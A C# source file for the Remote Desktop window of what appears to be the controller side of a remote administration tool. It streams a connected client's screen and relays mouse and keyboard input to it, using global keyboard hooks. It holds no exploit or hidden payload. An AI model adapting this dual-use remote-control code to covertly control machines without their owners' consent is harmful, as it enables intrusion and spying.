using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Collections.Generic;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Utilities;
using xServer.Core.MouseKeyHook;
using xServer.Enums;

namespace xServer.Forms
{
    public partial class FrmRemoteDesktop : Form
    {
        public bool IsStarted { get; private set; }
        private readonly Client _connectClient;
        private bool _enableMouseInput;
        private bool _enableKeyboardInput;
        private IKeyboardMouseEvents _keyboardHook;
        private IKeyboardMouseEvents _mouseHook;
        private List<Keys> _keysPressed;

        public FrmRemoteDesktop(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRdp = this;

            SubscribeEvents();
            InitializeComponent();
        }

        private void FrmRemoteDesktop_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Desktop", _connectClient);
            stopMenuItem.Enabled = false;

            _keysPressed = new List<Keys>();

            if (_connectClient.Value != null)
                new Core.Packets.ServerPackets.GetMonitors().Execute(_connectClient);
        }

        /// <summary>
        /// Subscribes the local mouse and keyboard hooks.
        /// </summary>
        private void SubscribeEvents()
        {
            if (PlatformHelper.RunningOnMono) // Mono/Linux
            {
                this.KeyDown += OnKeyDown;
                this.KeyUp += OnKeyUp;
            }
            else // Windows
            {
                _keyboardHook = Hook.GlobalEvents();
                _keyboardHook.KeyDown += OnKeyDown;
                _keyboardHook.KeyUp += OnKeyUp;

                _mouseHook = Hook.AppEvents();
                _mouseHook.MouseWheel += OnMouseWheelMove;
            }
        }

        /// <summary>
        /// Unsubscribes the local mouse and keyboard hooks.
        /// </summary>
        private void UnsubscribeEvents()
        {
            if (PlatformHelper.RunningOnMono) // Mono/Linux
            {
                this.KeyDown -= OnKeyDown;
                this.KeyUp -= OnKeyUp;
            }
            else // Windows
            {
                if (_keyboardHook != null)
                {
                    _keyboardHook.KeyDown -= OnKeyDown;
                    _keyboardHook.KeyUp -= OnKeyUp;
                    _keyboardHook.Dispose();
                }
                if (_mouseHook != null)
                {
                    _mouseHook.MouseWheel -= OnMouseWheelMove;
                    _mouseHook.Dispose();
                }
            }
        }

        public void AddMonitors(int monitors)
        {
            try
            {
                cbMonitors.Invoke((MethodInvoker)delegate
                {
                    for (int i = 0; i < monitors; i++)
                        cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
                    cbMonitors.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void UpdateImage(Bitmap bmp, bool cloneBitmap = false)
        {
            picDesktop.UpdateImage(bmp, cloneBitmap);
           
        }

        private void _frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Desktop", _connectClient), e.CurrentFramesPerSecond.ToString("0.00"));
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ToggleControls(bool t)
        {
            IsStarted = !t;
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    startMenuItem.Enabled = t;
                    stopMenuItem.Enabled = !t;
                    barQuality.Enabled = t;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void FrmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!picDesktop.IsDisposed && !picDesktop.Disposing)
                picDesktop.Dispose();
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRdp = null;

            UnsubscribeEvents();
        }

        private int GetRemoteWidth(int localX)
        {
            return localX * picDesktop.ScreenWidth / picDesktop.Width;
        }

        private int GetRemoteHeight(int localY)
        {
            return localY * picDesktop.ScreenHeight /picDesktop.Height+60;
        }

        private void picDesktop_MouseDown(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                MouseAction action = MouseAction.None;

                if (e.Button == MouseButtons.Left)
                    action = MouseAction.LeftDown;
                if (e.Button == MouseButtons.Right)
                    action = MouseAction.RightDown;

                int selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoMouseEvent(action, true, remote_x, remote_y, selectedMonitorIndex).Execute(_connectClient);
            }
        }

        private void picDesktop_MouseUp(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                MouseAction action = MouseAction.None;

                if (e.Button == MouseButtons.Left)
                    action = MouseAction.LeftDown;
                if (e.Button == MouseButtons.Right)
                    action = MouseAction.RightDown;

                int selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoMouseEvent(action, false, remote_x, remote_y, selectedMonitorIndex).Execute(_connectClient);
            }
        }

        private void picDesktop_MouseMove(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                int selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoMouseEvent(MouseAction.MoveCursor, false, remote_x, remote_y, selectedMonitorIndex).Execute(_connectClient);
            }
        }

        private void OnMouseWheelMove(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
            {
                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoMouseEvent(e.Delta == 120 ? MouseAction.ScrollUp : MouseAction.ScrollDown, false, 0, 0, cbMonitors.SelectedIndex).Execute(_connectClient);
            }
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            if (picDesktop.Image != null && _enableKeyboardInput && IsStarted && this.ContainsFocus)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                if (_keysPressed.Contains(e.KeyCode))
                    return;

                _keysPressed.Add(e.KeyCode);

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoKeyboardEvent((byte)e.KeyCode, true).Execute(_connectClient);
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            if (picDesktop.Image != null && _enableKeyboardInput && IsStarted && this.ContainsFocus)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                _keysPressed.Remove(e.KeyCode);

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoKeyboardEvent((byte)e.KeyCode, false).Execute(_connectClient);
            }
        }

        private bool IsLockKey(Keys key)
        {
            return ((key & Keys.CapsLock) == Keys.CapsLock)
                || ((key & Keys.NumLock) == Keys.NumLock)
                || ((key & Keys.Scroll) == Keys.Scroll);
        }

        private void closeMenuItem_Click(object sender, EventArgs e)
        {
            ActiveForm.Close();
        }

        private void startMenuItem_Click(object sender, EventArgs e)
        {
            if (cbMonitors.Items.Count == 0)
            {
                MessageBox.Show("No monitor detected.\nPlease wait till the client sends a list with available monitors.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            ToggleControls(false);

            picDesktop.Start();

            // Subscribe to the new frame counter.
            picDesktop.SetFrameUpdatedEvent(_frameCounter_FrameUpdated);

            this.ActiveControl = picDesktop;

            new Core.Packets.ServerPackets.GetDesktop(barQuality.Value, cbMonitors.SelectedIndex).Execute(_connectClient);

        }

        private void stopMenuItem_Click(object sender, EventArgs e)
        {
            ToggleControls(true);

            picDesktop.Stop();

            // Unsubscribe from the frame counter. It will be re-created when starting again.
            picDesktop.UnsetFrameUpdatedEvent(_frameCounter_FrameUpdated);

            this.ActiveControl = picDesktop;

        }

        private void monitorMenuItem_Click(object sender, EventArgs e)
        {
            cbMonitors.Focus();
        }

        private void mouseMenuItem_Click(object sender, EventArgs e)
        {
            if (_enableMouseInput)
            {
                this.picDesktop.Cursor = Cursors.Default;
                mouseMenuItem.ToolTipText = "Enable mouse input.";
                _enableMouseInput = false;
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Hand;
                mouseMenuItem.ToolTipText = "Disable mouse input.";
                _enableMouseInput = true;
            }
            mouseMenuItem.Checked = !mouseMenuItem.Checked;
            this.ActiveControl = picDesktop;
        }

        private void keyboardMenuItem_Click(object sender, EventArgs e)
        {
            if (_enableKeyboardInput)
            {
                this.picDesktop.Cursor = Cursors.Default;
                keyboardMenuItem.ToolTipText = "Enable keyboard input.";
                _enableKeyboardInput = false;
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Hand;
                keyboardMenuItem.ToolTipText = "Disable keyboard input.";
                _enableKeyboardInput = true;
            }
            keyboardMenuItem.Checked = !keyboardMenuItem.Checked;
            this.ActiveControl = picDesktop;
        }

        private void screenCaptureMenuItem_Click(object sender, EventArgs e)
        {
            if (picDesktop.Image != null)
                savePicture();
        }

        private void savePicture()
        {
            using (SaveFileDialog sfdlg = new SaveFileDialog())
            {
                sfdlg.Title = "Screen Capture Save";
                sfdlg.Filter = "Joint Photographic Experts Group (*.jpeg)|*.jpg|Portable Network Graphics (*.png)|*.png|Tagged Image File Format (*.tif)|*.tif|Graphics Interchange Format (*.gif)|*.gif|Windows bitmap (*.bmp)|*.bmp|All files(*.*)|*.*";
                if (sfdlg.ShowDialog(this) == DialogResult.OK)
                {
                    switch (sfdlg.FilterIndex)
                    {
                        case 1:
                            picDesktop.Image.Save(@sfdlg.FileName, ImageFormat.Jpeg);
                            break;
                        case 2:
                            picDesktop.Image.Save(@sfdlg.FileName, ImageFormat.Png);
                            break;
                        case 3:
                            picDesktop.Image.Save(@sfdlg.FileName, ImageFormat.Tiff);
                            break;
                        case 4:
                            picDesktop.Image.Save(@sfdlg.FileName, ImageFormat.Gif);
                            break;
                        case 5:
                            picDesktop.Image.Save(@sfdlg.FileName, ImageFormat.Bmp);
                            break;
                        case 6:
                            picDesktop.Image.Save(@sfdlg.FileName);
                            break;
                    }
                }
            }
        }

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            qualityShowMenuItem.Text = value.ToString();

            if (value < 25)
                qualityShowMenuItem.Text += " Low";
            else if (value >= 85)
                qualityShowMenuItem.Text += " Best";
            else if (value >= 75)
                qualityShowMenuItem.Text += " High";
            else if (value >= 25)
                qualityShowMenuItem.Text += " Mid";

            this.ActiveControl = picDesktop;
        }
    }
}